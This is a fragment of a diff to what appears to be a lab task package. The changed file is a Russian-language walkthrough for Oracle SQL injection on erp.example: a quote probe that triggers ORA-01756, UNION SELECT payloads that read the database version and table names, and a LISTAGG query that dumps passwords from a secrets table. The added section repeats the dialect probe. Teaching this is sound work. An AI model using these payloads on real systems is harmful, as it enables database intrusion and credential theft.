@@ -13,7 +13,7 @@
     },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: Oracle-инъекция на erp.example\n\nЦель — `http://erp.example/report?id=1` (Java + Oracle).\n\n1. Диалект: `curl -s \"http://erp.example/report?id=1'\"` → `ORA-01756`.\n2. Версия: `... UNION SELECT 1,(SELECT banner FROM v$version WHERE rownum=1),3 FROM dual-- -`.\n3. Таблицы: `... UNION SELECT 1,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),3 FROM user_tables-- -`.\n4. Флаг: `... LISTAGG(password,CHR(10)) ... FROM secrets-- -`.\n5. `... | grep 'nto' > found.txt`, затем `check`.\nПомни: `LIMIT` в Oracle нет, `#` не комментирует.\n"
+      "text": "# Практика: Oracle-инъекция на erp.example\n\nЦель — `http://erp.example/report?id=1` (Java + Oracle).\n\n1. Диалект: `curl -s \"http://erp.example/report?id=1'\"` → `ORA-01756`.\n2. Версия: `... UNION SELECT 1,(SELECT banner FROM v$version WHERE rownum=1),3 FROM dual-- -`.\n3. Таблицы: `... UNION SELECT 1,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),3 FROM user_tables-- -`.\n4. Флаг: `... LISTAGG(password,CHR(10)) ... FROM secrets-- -`.\n5. `... | grep 'nto' > found.txt`, затем `check`.\nПомни: `LIMIT` в Oracle нет, `#` не комментирует.\n\n## Повторение (`web-sqli`)\n\nПрежде чем строить OOB-канал, вернись к первому шагу из `web-sqli` — **узнать диалект по ошибке**. Подставь кавычку:\n\n    curl -s \"http://erp.example/report?id=1'\"\n\n`ORA-01756` — это Oracle; помни, что тут `FROM dual`, а строку склеивает `||`/`LISTAGG`, а не `CONCAT`.\n"
     }
   ],
   "tools": {
